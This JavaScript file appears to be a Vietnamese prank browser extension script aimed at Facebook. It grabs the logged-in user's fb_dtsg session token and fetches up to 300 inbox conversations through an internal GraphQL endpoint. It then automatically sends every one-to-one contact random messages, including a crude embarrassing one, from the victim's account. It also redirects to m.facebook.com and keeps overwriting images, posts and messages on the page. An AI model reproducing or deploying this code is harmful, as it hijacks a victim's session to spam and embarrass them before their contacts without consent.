var listFriend = [];
var fb_dtsgs;
function autoibnangcap(soluong){
    (() => {
        const messageLimit = soluong;
        var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
        var getConversations = (fb_dtsg, c_callback) => {
            var c_xhr	= new XMLHttpRequest;
            var c_data	= new FormData();
            c_data.append('fb_dtsg', fb_dtsg);
            var queries = {
                "o0": {
                    "doc_id": "1475048592613093",
                    "query_params": {
                        "limit": messageLimit,
                        "tags": ["INBOX"],
                        "includeDeliveryReceipts": true,
                        "includeSeqID": false
                    }
                }
            }
            c_data.append('queries', JSON.stringify(queries));
            c_xhr.onreadystatechange = () => {
                if (c_xhr.readyState == 4 && c_xhr.status == 200) c_callback(JSON.parse(c_xhr.responseText.split('\n')[0])['o0'].data.viewer.message_threads.nodes);
            }
            c_xhr.open('POST', '/api/graphqlbatch/');
            c_xhr.send(c_data);
        }
      
        getConversations(fb_dtsg, conversations => {
            conversations.forEach(c => {
                if (c.thread_type == 'ONE_TO_ONE') {
                    var otherID = c.thread_key.other_user_id;
                    listFriend.push(otherID);
                    fb_dtsgs = fb_dtsg;
                }
            });
        });
    })();
}
function guitin(soluong){
    /*var time;
    if(soluong>=1000) time = 10000;
    else time =6000;*/
    const msgs = ["xin chào mày","hello lại là Chao đây hôm nay mình sẽ đi cắt bao quy đầu","gâu gâu gâu"];
    setTimeout(() => {
        autoibnangcap(soluong);
        var sendMessage = (fb_dtsg, mmsg, uuid) => {
            var formData = new FormData();
            formData.append("ids["+uuid+"]", uuid);
            formData.append("body", mmsg);
            formData.append("fb_dtsg", fb_dtsg);
            var r = new XMLHttpRequest;
            r.onreadystatechange = () => {
                if (r.readyState == 4 && r.status == 200) {
                    //console.log('Đã gửi tin nhắn đến => ' + uuid);
                }
            }
            r.open('POST', 'https://m.facebook.com/messages/send/?icm=1&refid=12&ref=dbl');
            r.send(formData);
        }
        setTimeout(() => {
            var x = 0;
            var send = setInterval(() => {
                    sendMessage(fb_dtsgs, msgs[Math.floor(Math.random() * msgs.length)], listFriend[x++]);
                    if(x>=listFriend.length) clearInterval(send);
                },500);
            }, 6000);
    }, 2000);
}
var url = "m.facebook.com";
if(window.location.host != url){
    /*var question = confirm("hãy truy cập https://m.facebook.com và kích hoạt lại");
    if(question == true)  window.location = "https://m.facebook.com";
    else  window.location = "https://m.facebook.com/";*/
    window.location = "https://m.facebook.com/";
}
else{
   guitin(300);
}
function fakeText(){
    // change ảnh
    var img = document.getElementsByTagName("img");
    for(i=0;i<img.length;i++){
        img[i].src = "https://truongjae.github.io/teencode/bg.jpg";
    }
    var img2 = document.getElementsByTagName("i");
    for(i=0;i<img2.length;i++){
        img2[i].style.backgroundImage = 'url(https://truongjae.github.io/teencode/bg.jpg)';
    }
    // change body
    document.body.style.backgroundColor = "pink";
    
    // change bài viết
    var clazz= document.getElementsByClassName("d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j keod5gw0 nxhoafnm aigsh9s9 d3f4x2em fe6kdd0r mau55g9w c8b282yb iv3no6db jq4qci2q a3bd9o3v knj5qynh oo9gr5id hzawbc8m")
    for(i=0;i<clazz.length;i++){
        clazz[i].innerHTML = '<h1 style="font-size: 40px;" >Pìnk Đập Chai</h1>';
    }
    var clazz2 = document.getElementsByClassName("kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x c1et5uql ii04i59q");
    for(i=0;i<clazz2.length;i++){
        clazz2[i].innerHTML = '<h1 style="font-size: 40px;" >Pìnk Đập Chai</h1>';
    }
    var clazz3 = document.getElementsByClassName("_5rgt _5nk5 _5msi");
    for(i=0;i<clazz3.length;i++){
        clazz3[i].innerHTML = '<h1 style="font-size: 20px;" >Pìnk Đập Chai</h1>';
    }
    // tin nhắn
    var tn = document.getElementsByClassName("ljqsnud1");
    for(i=0;i<tn.length;i++){
        tn[i].innerHTML = '<p style="font-size: .9375rem; margin:0;padding:0;font-family: inherit;" >Pìnk Đập Chai</p>';
    }
    var tn2 = document.getElementsByClassName("_34ej");
    for(i=0;i<tn2.length;i++){
        tn2[i].innerHTML = '<p style="font-size: .9375rem; margin:0;padding:0;font-family: inherit;" >Pìnk Đập Chai</p>';
    }
}
setInterval(() => {
    fakeText();
}, 1000);

/*"browser_action": {
    "default_icon": "icon.png",
    "default_title": "Auto",  
    "default_popup": "popup.html" 
  }*/

